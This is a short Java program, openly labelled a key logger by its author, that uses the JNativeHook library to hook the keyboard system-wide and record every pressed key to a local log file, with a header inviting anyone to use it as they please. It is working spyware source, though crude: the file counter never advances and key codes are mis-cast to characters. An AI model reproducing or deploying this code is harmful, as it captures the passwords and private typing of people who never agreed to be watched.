    
/**
 * 
 * 
 * key logger made by h0r / @slick#9860
 * 
 * You can do what you please with this, just be repsonsible. 
 * 
 * 
 */
 
import java.util.*;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class keyLogger implements NativeKeyListener
{
    public static void main(String[] args) 
    {
        try {
            int p = 0;
            File file=new File("logs"+p+".txt");
            p++;
            FileOutputStream fos=new FileOutputStream(file,true);
            System.setOut(new PrintStream(fos));
            
        }   catch (FileNotFoundException e1) {
            e1.printStackTrace();
        } 
        try {
            
            GlobalScreen.registerNativeHook();
            // Clear previous logging configurations.
              ;
        }catch (NativeHookException e) {
            e.printStackTrace();
            
        }
        GlobalScreen.getInstance().addNativeKeyListener(new keyLogger());
        Scanner in = new Scanner(System.in);
        String keep = in.next();
    }    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println(((char) e.getKeyCode()) + " was pressed.");
        
    }
    public void nativeKeyReleased(NativeKeyEvent arg0) {
    
        
    }
    public void nativeKeyTyped(NativeKeyEvent arg0) {
        
        
    }
}
